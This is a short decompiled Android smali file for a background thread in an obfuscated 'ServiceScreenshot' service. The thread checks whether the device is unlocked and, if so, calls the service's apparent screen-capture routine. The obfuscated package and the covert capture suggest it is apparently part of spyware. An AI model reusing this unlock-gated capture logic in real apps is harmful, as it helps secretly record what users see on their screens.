.class Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot$fddo;
.super Ljava/lang/Thread;
.source ""


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->onStartCommand(Landroid/content/Intent;II)I
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic fddo:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;


# direct methods
.method constructor <init>(Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;)V
    .registers 2

    iput-object p1, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot$fddo;->fddo:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .registers 3

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot$fddo;->fddo:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

    const-string v1, "keyguard"

    invoke-virtual {v0, v1}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    invoke-virtual {v0}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v0

    if-nez v0, :cond_15

    iget-object v0, p0, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot$fddo;->fddo:Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;

    invoke-static {v0}, Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;->fddo(Lnaqsl/ebxcb/exu/API/Screenshot/ServiceScreenshot;)V

    :cond_15
    return-void
.end method
